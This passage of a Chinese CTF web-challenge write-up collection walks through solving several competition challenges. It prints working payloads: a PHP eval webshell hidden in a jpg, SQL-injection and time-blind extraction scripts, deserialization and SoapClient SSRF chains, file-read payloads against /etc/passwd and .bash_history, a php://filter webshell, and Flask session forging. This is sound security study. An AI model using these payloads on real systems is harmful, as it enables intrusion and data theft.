\u0026lt;/FilesMatch\u0026gt; /var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess\n传wuhu.jpg\n\u0026lt;?php eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; /var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg\n连蚁剑，拿flag\nflag{0188a589-fefe-4939-95d1-cbcc433fc9b2}\n[MRCTF2020]Ez_bypass | is_numeric 排版问题，看页面源码\nI put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first md5数组绕过，is_numeric绕过\n/?id[]=1\u0026amp;gg[]=2 POST: passwd=1234567%20 flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}\n[网鼎杯 2020 青龙组]AreUSerialz | 反序列化 private-func \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \u0026#34;1\u0026#34;; $filename = \u0026#34;/tmp/tmpfile\u0026#34;; $content = \u0026#34;Hello World!\u0026#34;; $this-\u0026gt;process(); } public function process() { if($this-\u0026gt;op == \u0026#34;1\u0026#34;) { $this-\u0026gt;write(); // 文件写 } else if($this-\u0026gt;op == \u0026#34;2\u0026#34;) { $res = $this-\u0026gt;read(); // 文件读 读flag $this-\u0026gt;output($res); } else { $this-\u0026gt;output(\u0026#34;Bad Hacker!\u0026#34;); } } private function write() { if(isset($this-\u0026gt;filename) \u0026amp;\u0026amp; isset($this-\u0026gt;content)) { if(strlen((string)$this-\u0026gt;content) \u0026gt; 100) { $this-\u0026gt;output(\u0026#34;Too long!\u0026#34;); die(); } $res = file_put_contents($this-\u0026gt;filename, $this-\u0026gt;content); if($res) $this-\u0026gt;output(\u0026#34;Successful!\u0026#34;); else $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } else { $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } } private function read() { $res = \u0026#34;\u0026#34;; if(isset($this-\u0026gt;filename)) { $res = file_get_contents($this-\u0026gt;filename); // 文件读 } return $res; } private function output($s) { echo \u0026#34;[Result]: \u0026lt;br\u0026gt;\u0026#34;; echo $s; } function __destruct() { if($this-\u0026gt;op === \u0026#34;2\u0026#34;) // 强比较 $op=2 int类型绕过 $this-\u0026gt;op = \u0026#34;1\u0026#34;; $this-\u0026gt;content = \u0026#34;\u0026#34;; $this-\u0026gt;process(); } } function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) // 只允许大小写+数字+普通字符 即可见字符 return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); // 先过滤再反序列化 } } 坑点在于private function序列化之后会产生不可见字符，两种绕过方式：php7.1+版本对属性不敏感，本地构造payload时全改为public；或者将%00*%00改为十六进制的\\00*\\00，同时将序列化结果中的s改为S\n这里用第一种，private全改public\n$obj = new FileHandler(); $obj-\u0026gt;op = 2; $obj-\u0026gt;filename = \u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;; echo serialize($obj); payload\n/?str=O:11:\u0026#34;FileHandler\u0026#34;:3:{s:2:\u0026#34;op\u0026#34;;i:2;s:8:\u0026#34;filename\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;s:7:\u0026#34;content\u0026#34;;N;} flag{0138599e-6ac8-4573-b448-e15635135f63}\n[GXYCTF2019]BabySQli | sqli 联合查询创建临时数据 页面源码提示：select * from user where username = \u0026lsquo;$name\u0026rsquo;；这说了跟没说一样，没告诉waf是啥\n大写绕过\n1\u0026#39;Order by 3%23\t# 有3列 1\u0026#39;union select 1,2,3%23\t# wrong user! 1\u0026#39;union select 1,\u0026#39;admin\u0026#39;,3%23\t# wrong pass! 说明用户名在第二列 我们采用的方式是联合查询 创建一行临时的新数据，以这个临时数据登入\nname=1\u0026#39;union select 1,\u0026#39;admin\u0026#39;,\u0026#39;202cb962ac59075b964b07152d234b70\u0026#39;#\u0026amp;pw=123 flag{a544cd1d-4676-41d2-8110-837020cf11e5}\n[GYCTF2020]Blacklist | sqli 堆叠注入 handler 跟qwb的随便注非常像，拿payload来试试\n1\u0026#39;;show tables; 1\u0026#39;;show columns from `FlagHere`; 1\u0026#39;;show columns from `words`; 1\u0026#39;;Set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `FlagHere`;\u0026#39;);Prepare x from @xx;execute x; 回显过滤条件\nreturn preg_match(\u0026#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 用handler on代替select\n1\u0026#39;; handler FlagHere open as amiz; handler amiz read first; handler amiz close;# handler...open打开一个表，使其后续可以使用handler...read访问，并且在该会话handler...close或终止前不会关闭\nflag{9ba3c903-1a8c-4a40-b32a-f9752251269c}\n[CISCN2019 华北赛区 Day2 Web1]Hack World | sqli 联合查询 盲注 长得跟前面的随便注和Blacklist很像，直接给出了flag在flag表flag列\n拿fuzz字典过一遍，过滤了and or union order group information，盲注py脚本走起，上二分\nimport requests url = \u0026#39;http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php\u0026#39; target = \u0026#39;glzjin\u0026#39; content = \u0026#39;\u0026#39; for i in range(1, 40): left = 32 right = 127 mid = (left + right) // 2 while right \u0026gt; left: payload = f\u0026#34;if(ascii(substr((select(flag)from(flag)),{i},1))\u0026gt;{mid},1,2)\u0026#34; data = {\u0026#34;id\u0026#34;:payload} response = requests.post(url, data) if target in response.text: left = mid + 1 else: right = mid mid = (left + right) // 2 content += chr(int(mid)) print(content) flag{1b79970-4e0-e-b78f-2d63d8c77375}\n[网鼎杯 2018]Fakebook | 反序列化 sqli load_file /robots.txt提示/user.php.bak\n\u0026lt;?php class UserInfo { public $name = \u0026#34;\u0026#34;; public $age = 0; public $blog = \u0026#34;\u0026#34;; public function __construct($name, $age, $blog) { $this-\u0026gt;name = $name; $this-\u0026gt;age = (int)$age; $this-\u0026gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u0026gt;get($this-\u0026gt;blog); } public function isValidBlog () { $blog = $this-\u0026gt;blog; return preg_match(\u0026#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026#34;, $blog); } } 有个curl，反序列化点\n$age = 18; $blog = \u0026#34;file:///var/www/html/flag.php\u0026#34;; $name = \u0026#34;amiz\u0026#34;; $a = new UserInfo($name,$age,$blog); echo serialize($a); O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;amiz\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;} 但是本身这玩意还得有个注入点，它在url最后的no参数处\n/view.php?no=1 order by 4%23\t# 5报错 共4列 不反序列化也行，它没过滤load_file直接就读文件了\n/view.php?no=-1 union/**/select/**/1,load_file(\u0026#34;/var/www/html/flag.php\u0026#34;),3,4%23 有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行\npage 03 [网鼎杯 2018]Comment | git泄露 sqli 二次注入 load_file 发帖会先要求登录，提示zhangwei: zhangwei***，盲猜666，登入\n帖子的详情页可以提交留言，这里有xss（但是没啥用 又没bot），f12有一句提示程序员GIT写一半跑路了,都没来得及Commit :)，用Githacker看看源码\ngithacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result 因为提示说有一个记录没有commit，我们尝试恢复\ngit log --reflog\t# 有一条后面带括号(refs/stash) 暂存区 sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 得到完整的源码\n\u0026lt;?php include \u0026#34;mysql.php\u0026#34;; session_start(); if($_SESSION[\u0026#39;login\u0026#39;] != \u0026#39;yes\u0026#39;){ header(\u0026#34;Location: ./login.php\u0026#34;); die(); } if(isset($_GET[\u0026#39;do\u0026#39;])){ switch ($_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;write\u0026#39;: $category = addslashes($_POST[\u0026#39;category\u0026#39;]); $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into board set category = \u0026#39;$category\u0026#39;, title = \u0026#39;$title\u0026#39;, content = \u0026#39;$content\u0026#39;\u0026#34;; $result = mysql_query($sql); header(\u0026#34;Location: ./index.php\u0026#34;); break; case \u0026#39;comment\u0026#39;: $bo_id = addslashes($_POST[\u0026#39;bo_id\u0026#39;]); $sql = \u0026#34;select category from board where id=\u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u0026gt;0){ $category = mysql_fetch_array($result)[\u0026#39;category\u0026#39;]; $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); } header(\u0026#34;Location: ./comment.php?id=$bo_id\u0026#34;); break; default: header(\u0026#34;Location: ./index.php\u0026#34;); } } else{ header(\u0026#34;Location: ./index.php\u0026#34;); } ?\u0026gt; 可以看到只有category没有被addslashes过滤，是直接将执行的结果进行拼接，这里是我们的入手点；先在write处插入，再在comment处闭合前面的注释符，执行结果\nwrite: category=\u0026#39;,content=user(),/* comment: content=*/# write: category=\u0026#39;,content=(select load_file(\u0026#39;/etc/passwd\u0026#39;)),/* comment: content=*/# 看到最后一行的www用户，继续查看.bash_history记录\nwrite: category=\u0026#39;,content=(select load_file(\u0026#39;/home/www/.bash_history\u0026#39;)),/* comment: content=*/# 看到了.DS_Store文件，在linux中它的位置一般在/tmp下，同时.DS_Store中经常有不可见字符，所以加一层hex再读出\nwrite: category=\u0026#39;,content=(select hex(load_file(\u0026#39;/tmp/html/.DS_Store\u0026#39;))),/* comment: content=*/# 看到flag_8946e1ff1ee3e40f.php，也加一层hex\nwrite: category=\u0026#39;,content=(select hex(load_file(\u0026#39;/var/www/html/flag_8946e1ff1ee3e40f.php\u0026#39;))),/* comment: content=*/# ————雀食很牛逼的二次注入\npage 07 [FireshellCTF2020]URL TO PDF | ssrf 会访问给出的网址，并把结果转为pdf呈现出来\n这个请求头显示是WeasyPrint 51，google可以搜到这一篇https://hackerone.com/reports/508123\n如果页面上存在这样的标签\n\u0026lt;link rel=\u0026#34;attachment\u0026#34; href=\u0026#34;file:///flag\u0026#34;\u0026gt; 或者\n\u0026lt;a rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///flag\u0026#39;\u0026gt; 就相当于SSRF请求了，并把结果附到pdf中，我们可以用binwalk分离一下内容\nbinwalk -e xxx.pdf cat *|grep flag 参考：wp\n[FireshellCTF2020]ScreenShooter | cve-2019-17221 LFI 跟上面那个前端一样，不过区别是会返回拍的照片\n看请求头用的是PhantomJS，搜到了这样一篇：PhantonJS_Arbitrary_File_Read.pdf，一个已知的cve-2019-17221\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var amiz; amiz = new XMLHttpRequest; amiz.onload = function(){ document.write(this.responseText) }; amiz.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///flag\u0026#34;); a.send(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 会造成XHR请求，任意文件读取\n[De1CTF 2019]ShellShellShell | sqli 时间盲注 soap反序列化 内网 upload 是N1ctf2018的easyphp+2018上海市赛web3的缝合+改编，不过这俩我都没做过，这是N1题的wp，这是web3的wp\n首先是源码泄露\n/index.php~ /user.php~ /config.php~ /views/index /views/login /views/logout /views/register /views/profile /views/publish /views/delete /views/phpinfo 在user.php中有很多sql的操作，结合这些函数我们可以知道一个名为ctf_usersd的表，有username, password, allow_diff_ip, id, is_admin, ip这几列；在register函数额外有出题人的一个注释做提示用，可以看到这一句直接把is_admin赋值为0\n跟入config.php看有关于sql的处理\n匹配反引号然后会被替换为单引号，我们只需要把我们sql注入的payload由单引号换成反引号即可\n由于注册成不成功什么的回显没有差别，所以使用时间盲注；另外这里有两个地方都可以sqli，一个是register()处一个是publish处\npublish这里是注册后就可以直接传参，而register那里还要用md5不停地生成验证码，所以我们选择注册一个号然后用publish这里作为注入点\nimport hashlib def func(md5_val): for x in range(999999, 100000000): md5_value=hashlib.md5(str(x).encode(encoding=\u0026#39;utf-8\u0026#39;)).hexdigest() if md5_value[:5]==md5_val: return str(x) if __name__ == \u0026#39;__main__\u0026#39;: print(func(\u0026#39;ac7a2\u0026#39;)) 时间盲注建议还是两个for循环吧，二分不知道为啥一直出问题\nimport requests url=\u0026#34;http://a4a900d6-ddc6-42eb-b95c-7e63d56d9bba.node4.buuoj.cn:81/index.php?action=publish\u0026#34; cookie = {\u0026#34;PHPSESSID\u0026#34;:\u0026#34;5j1p272lfmi425cpmkv9lik9o7\u0026#34;} k=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; flag=\u0026#34;\u0026#34; for i in range(50): for j in k: j = ord(j) data={ \u0026#39;mood\u0026#39;:\u0026#39;0\u0026#39;, \u0026#39;signature\u0026#39;:\u0026#39;1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#\u0026#39;.format(i,j) } try: r=requests.post(url,data=data,cookies=cookie,timeout=(2,2)) except: flag+=chr(j) print(flag) break 跑出来md5解密后得到jaivypassword\n有密码和账号却登不了，因为他在sql表中设置了allow_diff_ip，只有管理员地址才可以，并且使用了$_SERVER['REMOTE_ADDR']\n没法xff绕过，只能找一处ssrf的点；从之前的phpinfo泄露可以看到开启了soap扩展，现在就缺一个反序列化点了\n这里的row[2]就是mood，也是我们可以控制的参数，就是注入点了\n操作的时候要注意，publish是一个需要登录后才能进行的操作，而我们传参是为了让admin得以登录，这里采取的方式是用另一个未登录页面的cookie的code生成payload，在已登录的账号上publish并触发反序列化，然后之前的未登录页面刷新即可直接进入个人信息页面了\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/index.php?action=login\u0026#39;; $post_string = \u0026#39;username=admin\u0026amp;password=jaivypassword\u0026amp;code=1243998\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: PHPSESSID=meailth0scq7kni7m5ihvr7974\u0026#39; ); $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;amiz^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers).\u0026#39;^^Content-Length: \u0026#39;.(string)strlen($post_string).\u0026#39;^^^^\u0026#39;.$post_string,\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;aaab\u0026#34;)); $aaa = serialize($b); $aaa = str_replace(\u0026#39;^^\u0026#39;,\u0026#34;\\r\\n\u0026#34;,$aaa); $aaa = str_replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,$aaa); echo bin2hex($aaa); ?\u0026gt; 之后admin的publish页面可以直接传webshell，提示flag在内网，用蚁剑连接扫一下内网\n在外网就可以直接访问了\n\u0026lt;?php $sandbox = \u0026#39;/var/sandbox/\u0026#39; . md5(\u0026#34;prefix\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]){ $filename = !empty($_POST[\u0026#39;file\u0026#39;]) ? $_POST[\u0026#39;file\u0026#39;] : $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; // 文件名和后缀分离 if (!is_array($filename)) { // 我们传入和文件类型file同名的数组 file[] 3个参数 $filename = explode(\u0026#39;.\u0026#39;, $filename); } $ext = end($filename);\t// 取的是file[0] if($ext==$filename[count($filename) - 1]){ // filename[count(filename)-1]=file[2] die(\u0026#34;try again!!!\u0026#34;); // file[0]=/../amiz.php\tfile[2]=222\tfile[1]=111 } $new_name = (string)rand(100,999).\u0026#34;.\u0026#34;.$ext; // 随机文件名 /../路径穿越绕过 move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$new_name); $_ = $_POST[\u0026#39;hello\u0026#39;]; if(@substr(file($_)[0],0,6)===\u0026#39;@\u0026lt;?php\u0026#39;){ // @\u0026lt;?php `find /etc -name *flag* -exec cat {} +`; if(strpos($_,$new_name)===false) { include($_); } else { echo \u0026#34;you can do it!\u0026#34;; } } unlink($new_name);\t// 绕过 ../xyz.php 或xyz.php/. 不会被删除 } else{ highlight_file(__FILE__); } 绕过方式参考-\u0026gt;2018上海web2\n然后构造php的curl，上传到upload处让它触发（太巧妙了吧~ 简直是天籁~\n我看赵师傅是用postman直接生成的payload，可是我生成的跟他的版本看起来完全不一样，少了post该有的很多东西，比如分割线啊，文件类型和内容什么的，不知道为啥\n\u0026lt;?php $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://10.0.39.6/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 30, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; \u0026#34;------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;amiz.php\\\u0026#34;\\r\\nContent-Type: false\\r\\n\\r\\n@\u0026lt;?php echo `find /etc -name *flag* -exec cat {} +`;\\r\\n\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;hello\\\u0026#34;\\r\\n\\r\\namiz.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[2]\\\u0026#34;\\r\\n\\r\\n222\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[1]\\\u0026#34;\\r\\n\\r\\n111\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[0]\\\u0026#34;\\r\\n\\r\\n/../amiz.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;submit\\\u0026#34;\\r\\n\\r\\nSubmit\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\u0026#34;, CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34;, \u0026#34;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } 上传后到/upload/s1.php页面就可以看到flag了\n上面php还有个绕过unlink的地方，在n1的题里是用一个.sh执行的删除命令，那样的话可以用-asdd.php这样绕过，因为开头是个-\n——————总结：肥肠复杂的一道题，杂揉了md5碰撞、SoapClient原生类反序列化、内网扫描、SSRF、php的trick等等一系列考点，就别说现做了，就是复现的难度也挺高的，师傅们牛逼\n参考：wp1 | wp2 | wp11 | wp12\n[WMCTF2020]Web Check in 2.0 | LFI rce 本来下午2点就该开始做的，但是下午去试学校站的log4j2了，结果这个洞没试出来 拿了一些弱口令，无心插柳了属于是\nstring(62) \u0026#34;Sandbox:/var/www/html/sandbox/437a765460ed3657d5fb80d24456c9e5\u0026#34;\u0026lt;?php //PHP 7.0.33 Apache/2.4.25 error_reporting(0); $sandbox = \u0026#39;/var/www/html/sandbox/\u0026#39; . md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); // 沙盒 路径确定\u0026amp;已知 @mkdir($sandbox); @chdir($sandbox); var_dump(\u0026#34;Sandbox:\u0026#34;.$sandbox); highlight_file(__FILE__); if(isset($_GET[\u0026#39;content\u0026#39;])) { $content = $_GET[\u0026#39;content\u0026#39;]; if(preg_match(\u0026#39;/iconv|UCS|UTF|rot|quoted|base64/i\u0026#39;,$content)) // 禁了一些伪协议读文件的编码方式 die(\u0026#39;hacker\u0026#39;); if(file_exists($content)) require_once($content); // 文件包含 file_put_contents($content,\u0026#39;\u0026lt;?php exit();\u0026#39;.$content); // 死亡exit()绕过 } 一点简单分析写注释了，首先是伪协议的部分，file_put_contents()支持伪协议，而伪协议处理时要先urldecode一次，所以我们传参的时候可以再编一次码\n出题人的这篇博客写的特别详细：关于file_put_contents的一些小测试\n远程环境中%25被ban了，我们可以写个脚本构造别的方式的2次编码，比如%7%23-\u0026gt;%72-\u0026gt;r就可以了\n\u0026lt;?php $char = \u0026#39;r\u0026#39;; #构造r的二次编码 for ($ascii1 = 0; $ascii1 \u0026lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 \u0026lt; 256; $ascii2++) { $aaa = \u0026#39;%\u0026#39;.$ascii1.\u0026#39;%\u0026#39;.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.\u0026#39;: \u0026#39;.$aaa; echo \u0026#34;\\n\u0026#34;; } } } ?\u0026gt; 我们选择rot13绕过\nphp://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0deval($_GET[1]);?\u0026gt;/resource=Cyc1e.php 上传的内容就会到Cycle.php中，?1=system('ls');，?1=system('cat /flag_2233_elkf3ifj34ij3orf3fk4');\n参考：wp\n***[CISCN2019 总决赛 Day1 Web3]Flask Message Board | ssti flask-session tensorflow flask，页面有三个输入框，还有标志性的session，Author输入框处存在SSTI，尝试获取key来伪造session\n'SECRET_KEY': '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI'\n这里伪造的时候要注意flask session cookie manager解密出来的时候把False的大写给去掉了，我们构造回去的时候应该用大写开头的\npython3 flask_session_cookie_manager3.py encode -s \u0026#39;1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI\u0026#39; -t \u0026#34;{\u0026#39;admin\u0026#39;:True}\u0026#34; 到/admin处有文件上传点\n看页面源码发现还有提示\n下载/admin/model_download，得到这么个玩意\n/admin/source_thanos可以直接访问\n就他妈离谱，这个源码是随机显示一部分，但是显示位置固定，得搞个脚本做复原\nimport requests url = \u0026#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos\u0026#39; r = requests.get(url) source = r.text for j in range(10): r = requests.get(url) for i in range(len(source)): if source[i].isspace(): source = source[:i] + r.text[i] + source[i+1:] print(source) # coding=utf8 from flask import Flask, flash, send_file import random from datetime import datetime import zipfile # init app app = Flask(__name__) app.secret_key = \u0026#39;\u0026#39;.join(random.choice(\u0026#34;il1I|\u0026#34;) for i in range(40)) print(app.secret_key) from flask import Response from flask import request, session from flask import redirect, url_for, safe_join, abort from flask import render_template_string from data import data post_storage = data site_title = \u0026#34;A Flask Message Board\u0026#34; site_description = \u0026#34;Just leave what you want to say.\u0026#34; # %% tf/load.py import tensorflow as tf from tensorflow.python import pywrap_tensorflow def init(model_path): \u0026#39;\u0026#39;\u0026#39; This model is given by a famous hacker ! \u0026#39;\u0026#39;\u0026#39; new_sess = tf.Session() meta_file = model_path + \u0026#34;.meta\u0026#34; model = model_path saver = tf.train.import_meta_graph(meta_file) saver.restore(new_sess, model) return new_sess def renew(sess, model_path): sess.close() return init(model_path) def predict(sess, x): \u0026#39;\u0026#39;\u0026#39; :param x: input number x sess: tensorflow session :return: b\u0026#39;You are: *\u0026#39; \u0026#39;\u0026#39;\u0026#39; y = sess.graph.get_tensor_by_name(\u0026#34;y:0\u0026#34;) y_out = sess.run(y, {\u0026#34;x:0\u0026#34;: x}) return y_out tf_path = \u0026#34;tf/detection_model/detection\u0026#34; sess = init(tf_path) # %% tf end def check_bot(input_str): r = predict(sess, sum(map(ord, input_str))) return r if isinstance(r, str) else r.decode() def render_template(filename, **args): with open(safe_join(app.template_folder, filename), encoding=\u0026#39;utf8\u0026#39;) as f: template = f.read() name = session.get(\u0026#39;name\u0026#39;, \u0026#39;anonymous\u0026#39;)[:10] # Someone call me to add a remembered_name function # But I\u0026#39;m just familiar with PHP !!! # return render_template_string( # template.replace(\u0026#39;$remembered_name\u0026#39;, name) # .replace(\u0026#39;$site_description\u0026#39;, site_description) # .replace(\u0026#39;$site_title\u0026#39;, site_title), **args) return render_template_string( template.replace(\u0026#39;$remembered_name\u0026#39;, name), site_description=site_description, site_title=site_title, **args) @app.route(\u0026#39;/\u0026#39;) def index(): global post_storage session[\u0026#39;admin\u0026#39;] = session.get(\u0026#39;admin\u0026#39;, False) if len(post_storage) \u0026gt; 20: post_storage = post_storage[-20:] return render_template(\u0026#39;index.html\u0026#39;, posts=post_storage) @app.route(\u0026#39;/post\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_post(): title = request.form.get(\u0026#39;title\u0026#39;, \u0026#39;[no title]\u0026#39;) content = request.form.get(\u0026#39;content\u0026#39;, \u0026#39;[no content]\u0026#39;) name = request.form.get(\u0026#39;author\u0026#39;, \u0026#39;anonymous\u0026#39;)[:10] try: check_result = check_bot(content) if not check_result.endswith(\u0026#39;Human\u0026#39;): flash(\u0026#34;reject because %s or hacker\u0026#34; % (check_result)) return redirect(\u0026#39;/\u0026#39;) post_storage.append( {\u0026#39;title\u0026#39;: title, \u0026#39;content\u0026#39;: content, \u0026#39;author\u0026#39;: name, \u0026#39;date\u0026#39;: datetime.now().strftime(\u0026#34;%B %d, %Y %X\u0026#34;)}) session[\u0026#39;name\u0026#39;] = name except Exception as e: flash(\u0026#39;Something wrong, contact admin.\u0026#39;) return redirect(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/admin/model_download\u0026#39;) def model_download(): \u0026#39;\u0026#39;\u0026#39; Download current model. \u0026#39;\u0026#39;\u0026#39; if session.get(\u0026#39;admin\u0026#39;, True): try: with zipfile.ZipFile(\u0026#34;temp.zip\u0026#34;, \u0026#39;w\u0026#39;) as z: for e in [\u0026#39;detection.meta\u0026#39;, \u0026#39;detection.index\u0026#39;, \u0026#39;detection.data-00000-of-00001\u0026#39;]: z.write(\u0026#39;tf/detection_model/\u0026#39; + e, arcname=e) return send_file(\u0026#34;temp.zip\u0026#34;, as_attachment=True, attachment_filename=\u0026#39;model.zip\u0026#39;) except Exception as e: flash(str(e)) return redirect(\u0026#39;/admin\u0026#39;) else: return \u0026#34;Not a admin **session**. \u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back\u0026lt;/a\u0026gt;\u0026#34; @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ad in(): global site_description, site_title, sess if session.get(\u0026#39;admin\u0026#39;, False): print(\u0026#39;admin session.\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: if request.form.get(\u0026#39;site_description\u0026#39;): site_description = request.form.get(\u0026#39;site_description\u0026#39;) if request.form.get(\u0026#39;site_title\u0026#39;): site_title = request.form.get(\u0026#39;site_title\u0026#39;) if request.files.get(\u0026#39;modelFile\u0026#39;): file = request.files.get(\u0026#39;modelFile\u0026#39;) # print(file, type(file)) try: z = zipfile.ZipFile(file=file) for e in [\u0026#39;detection.meta\u0026#39;, \u0026#39;det ction.index\u0026#39;, \u0026#39;detection.data-00000-of-00001\u0026#39;]: 